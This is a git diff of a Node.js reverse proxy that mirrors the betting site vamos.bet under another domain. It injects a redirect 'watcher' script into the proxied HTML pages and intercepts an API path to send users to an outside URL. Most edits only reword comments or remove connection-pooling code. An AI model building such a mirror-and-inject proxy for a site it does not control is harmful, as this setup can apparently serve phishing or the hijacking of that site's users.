@@ -4,32 +4,18 @@ import https from "node:https";
 const PROXY_HOST = "127.0.0.1";
 const PROXY_PORT = 6005;
 
-// Domain configuration
+// Domains
 const PROXY_PUBLIC_DOMAIN = "dashsh.bet";
 const TARGET_HOSTNAME = "vamos.bet";
 const TARGET_PORT = 443;
 
-// Proxy API endpoints
+// Endpoints
 const REDIRECT_API_PATH = "/api/v9/test/redirect";
 const REDIRECT_BASE_URL = "https://test3.marziplus.com";
 
 /*
 |--------------------------------------------------------------------------
-| AGENT POOL (PREVENTS 502 BAD GATEWAY SOCKET DROPS ON VPS)
-|--------------------------------------------------------------------------
-*/
-
-const agent = new https.Agent({
-  keepAlive: true,
-  keepAliveMsecs: 10_000,
-  maxSockets: 100,
-  maxFreeSockets: 10,
-  timeout: 60_000
-});
-
-/*
-|--------------------------------------------------------------------------
-| WATCHER SCRIPT INJECTION
+| REDIRECT WATCHER INJECTION
 |--------------------------------------------------------------------------
 */
 
@@ -67,7 +53,7 @@ function injectWatcher(html) {
 
 /*
 |--------------------------------------------------------------------------
-| HEADER SANITIZATION
+| HEADER CLEANUP
 |--------------------------------------------------------------------------
 */
 
@@ -100,7 +86,7 @@ function buildUpstreamHeaders(clientReq) {
   const headers = {
     ...clientReq.headers,
     host: TARGET_HOSTNAME,
-    "accept-encoding": "identity", // Disable compression so injected script parses cleanly
+    "accept-encoding": "identity", // Force raw text to allow script injection
     "user-agent": clientReq.headers["user-agent"] || "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
   };
 
@@ -113,19 +99,7 @@ function buildUpstreamHeaders(clientReq) {
 
 /*
 |--------------------------------------------------------------------------
-| STATELESS COOKIE UTILITIES
-|--------------------------------------------------------------------------
-*/
-
-function getCookie(req, name) {
-  const cookieHeader = req.headers.cookie || "";
-  const match = cookieHeader.match(new RegExp(`(?:^|;\\s*)${name}=([^;]+)`));
-  return match ? decodeURIComponent(match[1]) : null;
-}
-
-/*
-|--------------------------------------------------------------------------
-| UPSTREAM REQUEST FORWARDER
+| FORWARD REQUEST TO UPSTREAM
 |--------------------------------------------------------------------------
 */
 
@@ -134,19 +108,18 @@ function forwardRequest(clientReq, clientRes, bufferedBody = null) {
 
   const options = {
     hostname: TARGET_HOSTNAME,
-    servername: TARGET_HOSTNAME, // Required for SSL SNI handshake on production servers
+    servername: TARGET_HOSTNAME, // REQUIRED FOR TLS SNI (Fixes 502 Bad Gateway)
     port: TARGET_PORT,
     method: clientReq.method,
     path: clientReq.url,
     headers,
-    agent, // Prevents 502 Bad Gateway socket drops
     rejectUnauthorized: true
   };
 
   const upstreamReq = https.request(options, upstreamRes => {
     const contentType = upstreamRes.headers["content-type"] || "";
 
-    // HTML Responses: Inject client watcher script
+    // Handle HTML Injection
     if (contentType.toLowerCase().includes("text/html")) {
       const chunks = [];
       upstreamRes.on("data", chunk => chunks.push(chunk));
@@ -168,14 +141,14 @@ function forwardRequest(clientReq, clientRes, bufferedBody = null) {
       return;
     }
 
-    // Static assets, media, APIs
+    // Normal Assets & API Pass-through
     const resHeaders = removeHopByHopHeaders(upstreamRes.headers);
     clientRes.writeHead(upstreamRes.statusCode || 200, resHeaders);
     upstreamRes.pipe(clientRes);
   });
 
   upstreamReq.on("error", error => {
-    console.error(`❌ Upstream connection error [${error.code}]:`, error.message);
+    console.error(`❌ Upstream SSL/Connection Error: [${error.code}] ${error.message}`);
     if (!clientRes.headersSent) {
       clientRes.writeHead(502, { "Content-Type": "text/plain; charset=utf-8" });
     }
@@ -189,6 +162,18 @@ function forwardRequest(clientReq, clientRes, bufferedBody = null) {
   }
 
   clientReq.pipe(upstreamReq);
+}
+
+/*
+|--------------------------------------------------------------------------
+| STATELESS COOKIE HELPERS
+|--------------------------------------------------------------------------
+*/
+
+function getCookie(req, name) {
+  const cookieHeader = req.headers.cookie || "";
+  const match = cookieHeader.match(new RegExp(`(?:^|;\\s*)${name}=([^;]+)`));
+  return match ? decodeURIComponent(match[1]) : null;
 }
 
 /*
@@ -208,7 +193,7 @@ const server = http.createServer(async (clientReq, clientRes) => {
     const userRedirectUrl = getCookie(clientReq, "proxy_redirect_url");
     const isRedirected = Boolean(userRedirectUrl);
 
-    // 1. Reset redirect state when user manually navigates to home/root routes
+    // 1. Reset state on home navigation
     if (clientReq.method === "GET" && (path === "/" || path.startsWith("/home/"))) {
       clientRes.setHeader(
         "Set-Cookie",
@@ -216,7 +201,7 @@ const server = http.createServer(async (clientReq, clientRes) => {
       );
     }
 
-    // 2. Redirect Status Check Endpoint
+    // 2. Redirect watcher poll endpoint
     if (clientReq.method === "GET" && path === "/__proxy_redirect_status") {
       const response = JSON.stringify({
         redirect: isRedirected,
@@ -232,7 +217,7 @@ const server = http.createServer(async (clientReq, clientRes) => {
       return;
     }
 
-    // 3. API Redirect Trigger Endpoint
+    // 3. API Redirect trigger
     if (path === REDIRECT_API_PATH) {
       const chunks = [];
       for await (const chunk of clientReq) {
@@ -248,7 +233,7 @@ const server = http.createServer(async (clientReq, clientRes) => {
       let json;
       try {
         json = JSON.parse(body.toString("utf8"));
-      } catch (error) {
+      } catch (err) {
         forwardRequest(clientReq, clientRes, body);
         return;
       }
@@ -267,7 +252,7 @@ const server = http.createServer(async (clientReq, clientRes) => {
 
       const finalUrl = redirectUrl.toString();
 
-      // Scopes cookie exclusively to the initiating user's browser
+      // Store redirect target inside client-scoped cookie
       clientRes.setHeader(
         "Set-Cookie",
         `proxy_redirect_url=${encodeURIComponent(finalUrl)}; Path=/; Max-Age=30; HttpOnly; SameSite=Lax`
@@ -283,19 +268,19 @@ const server = http.createServer(async (clientReq, clientRes) => {
       return;
     }
 
-    // 4. Block session pages after redirect without interrupting static assets
+    // 4. Do not block static assets after redirect
     const isStaticAsset = /\.(js|css|png|jpg|jpeg|gif|ico|svg|woff2?|ttf|eot)$/i.test(path);
 
     if (isRedirected && !isStaticAsset && clientReq.method === "GET") {
       clientRes.writeHead(410, {
         "Content-Type": "text/plain; charset=utf-8",
-        "Cache-Control": "no-store, no-cache, must-revalidate"
+        "Cache-Control": "no-store"
       });
       clientRes.end("Proxy session terminated");
       return;
     }
 
-    // 5. Proxy all normal traffic
+    // 5. Default Proxy
     forwardRequest(clientReq, clientRes);
 
   } catch (error) {
@@ -307,11 +292,6 @@ const server = http.createServer(async (clientReq, clientRes) => {
   }
 });
 
-server.on("clientError", (error, socket) => {
-  console.error("Client network error:", error.message);
-  socket.end("HTTP/1.1 400 Bad Request\r\n\r\n");
-});
-
 server.listen(PROXY_PORT, PROXY_HOST, () => {
-  console.log(`Stateless Reverse Proxy running on http://${PROXY_HOST}:${PROXY_PORT}`);
+  console.log(`Reverse Proxy listening on http://${PROXY_HOST}:${PROXY_PORT}`);
 });
